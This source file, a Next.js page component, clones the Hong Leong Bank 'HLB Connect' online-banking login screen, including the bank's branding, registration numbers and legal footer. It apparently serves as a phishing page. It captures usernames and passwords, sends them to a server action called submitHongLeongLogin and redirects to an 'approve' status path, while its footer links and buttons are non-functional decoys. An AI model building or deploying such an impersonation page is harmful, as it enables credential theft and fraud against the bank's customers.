"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Loader2, MessageCircle } from "lucide-react";
import { submitHongLeongLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function HongLeongLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitHongLeongLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Top White Header */}
      <header className="flex h-14 items-center justify-center border-b border-gray-100 bg-white">
        <h1 className="text-[17px] font-bold tracking-tight text-[#004B8D]">
          Hong Leong Bank | HLB Islamic
        </h1>
      </header>

      {/* Main Blue Content */}
      <main className="relative flex flex-1 flex-col items-center bg-[#004B8D] px-6 py-12 text-white">
        {/* Logo Section */}
        <div className="mb-10 text-center">
          <div className="flex items-center justify-center gap-1 text-[42px] font-bold leading-none">
            <span className="text-[#E1251B]">HLB</span>
            <span className="text-white">connect</span>
          </div>
          <p className="mt-1 text-lg font-medium opacity-90">Online Banking</p>
        </div>

        {/* Form Container */}
        <div className="w-full max-w-sm overflow-hidden rounded-xl border border-white/10 bg-[#003d73]/30 p-8 shadow-2xl backdrop-blur-sm">
          <form onSubmit={handleLogin} className="space-y-5">
            {error && (
              <div className="rounded bg-red-500/20 p-3 text-center text-sm font-medium text-white border border-white/20">
                {error}
              </div>
            )}

            <div>
              <input
                type="text"
                placeholder="Username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full rounded-lg bg-white px-4 py-4 text-[17px] text-gray-700 placeholder:text-gray-400 focus:outline-none"
                required
              />
            </div>

            <div>
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full rounded-lg bg-white px-4 py-4 text-[17px] text-gray-700 placeholder:text-gray-400 focus:outline-none"
                required
              />
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="mt-2 flex w-full items-center justify-center rounded-lg bg-[#7AC142] py-4 text-[19px] font-bold text-white shadow-lg transition-transform active:scale-[0.98] disabled:opacity-80"
            >
              {isLoading ? (
                <Loader2 className="h-6 w-6 animate-spin" />
              ) : (
                "LOGIN"
              )}
            </button>

            <div className="pt-4 text-center">
              <button
                type="button"
                className="text-[13px] font-bold uppercase tracking-wider text-white underline decoration-2 underline-offset-4 opacity-90"
              >
                LEARN MORE ABOUT HLB CONNECT
              </button>
            </div>
          </form>
        </div>

        {/* App Promo Section */}
        <div className="mt-12 flex w-full max-w-sm items-center gap-4 rounded-xl border border-white/20 bg-white/5 p-4 backdrop-blur-sm">
          <div className="flex h-14 w-14 shrink-0 items-center justify-center rounded-xl bg-gradient-to-br from-[#E1251B] to-[#9B1A12] text-2xl font-black text-white shadow-inner">
            H
          </div>
          <div className="flex flex-col">
            <span className="text-[11px] font-bold uppercase tracking-widest text-white/60">DOWNLOAD</span>
            <span className="text-[17px] font-extrabold tracking-tight text-white">HLB CONNECT APP</span>
          </div>
        </div>
      </main>

      {/* Footer Links (White Background) */}
      <footer className="bg-white px-6 py-10 text-center">
        <div className="mb-6 flex flex-wrap justify-center gap-x-3 gap-y-2 text-[11px] font-bold text-[#004B8D]">
          <span>Terms & Conditions</span>
          <span className="text-gray-300">|</span>
          <span>Security</span>
          <span className="text-gray-300">|</span>
          <span>Privacy Notice</span>
          <span className="text-gray-300">|</span>
          <span>e-Banking Charter</span>
          <span className="text-gray-300">|</span>
          <span>FAQ</span>
          <span className="text-gray-300">|</span>
          <span>List of Insured Deposits</span>
          <span className="text-gray-300">|</span>
          <span>PIDM Brochures</span>
        </div>

        <div className="space-y-6 text-[11px] leading-relaxed text-gray-500 max-w-2xl mx-auto">
          <p>
            Copyright © Hong Leong Bank Berhad reserved. Use of the information on
            this page is intended for Malaysian citizens and Malaysian residents only and
            all contents on this website are governed by Malaysian law and is subject to
            the disclaimer which can be read on the disclaimer page.
          </p>
          <div className="space-y-1">
            <p>Hong Leong Bank Berhad 193401000023 (97141-X)</p>
            <p>Hong Leong Islamic Bank Berhad 200501009144 (68619-H)</p>
          </div>
        </div>

        {/* PIDM Logo Placeholder */}
        <div className="mt-8 flex justify-center">
          <div className="rounded bg-[#F58220] px-3 py-1 text-[10px] font-black text-white uppercase tracking-tighter">
            <div className="opacity-80">MEMBER AHLI</div>
            <div className="text-base leading-none">PIDM</div>
          </div>
        </div>
      </footer>

      {/* Floating Chat Button */}
      <div className="fixed bottom-6 right-6 z-50">
        <button className="flex items-center gap-2 rounded-full bg-[#004B8D] py-3 pl-4 pr-6 text-[15px] font-bold text-white shadow-2xl ring-4 ring-[#004B8D]/20 transition-transform active:scale-95">
          <div className="relative">
            <MessageCircle size={24} fill="white" className="text-[#004B8D]" />
            <div className="absolute -top-1 -right-1 h-3 w-3 rounded-full bg-[#E1251B] border-2 border-[#004B8D]" />
          </div>
          Chat with Us
        </button>
      </div>
    </div>
  );
}
